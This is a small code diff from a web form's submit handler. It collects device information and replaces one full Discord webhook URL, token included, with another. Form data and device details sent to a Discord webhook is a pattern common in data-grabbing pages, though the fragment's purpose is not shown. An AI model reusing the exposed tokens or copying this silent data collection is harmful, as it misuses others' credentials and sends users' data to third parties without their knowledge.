@@ -48,7 +48,7 @@ document.getElementById('form').addEventListener('submit', async function (event
   const deviceInfo = getDeviceInfo();
 
   // URL of the Discord Webhook (replace with your Webhook URL)
-  const webhookURL = 'https://discord.com/api/webhooks/1292486311491670067/_DvEUrHCzgEEtfROcGZy_pIEe9akufMe7wnWVLLGSLBw38kzeSCbqpsZaK2CLMktr9Hn';
+  const webhookURL = 'https://discord.com/api/webhooks/1334194309720965140/7ckUxBk2pGeIUOFPZ_tY9fbNslpn33iO9Bl0NgbWDRW96Bcby81bgtOHjJrRctHlKaFH';
 
   // Prepare the payload for the Discord Webhook
   const payload = {
